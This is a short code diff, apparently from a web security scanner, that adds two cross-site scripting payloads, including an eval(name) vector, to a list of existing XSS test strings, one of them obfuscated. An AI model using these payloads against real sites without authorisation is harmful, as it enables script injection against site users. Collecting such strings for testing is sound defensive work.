@@ -280,6 +280,8 @@ _probes = [
 
 # xss payloads
 _payloads = [
+    '<q/oncut=open()>',
+    '<svg/onload=eval(name)>',
     '<img src=x onerror=alert(/xss/)>',
     """<img src="javascript:alert('xss');">""",
     """<style>@im\\port'\\ja\\vasc\\ript:alert("xss")';</style>""",
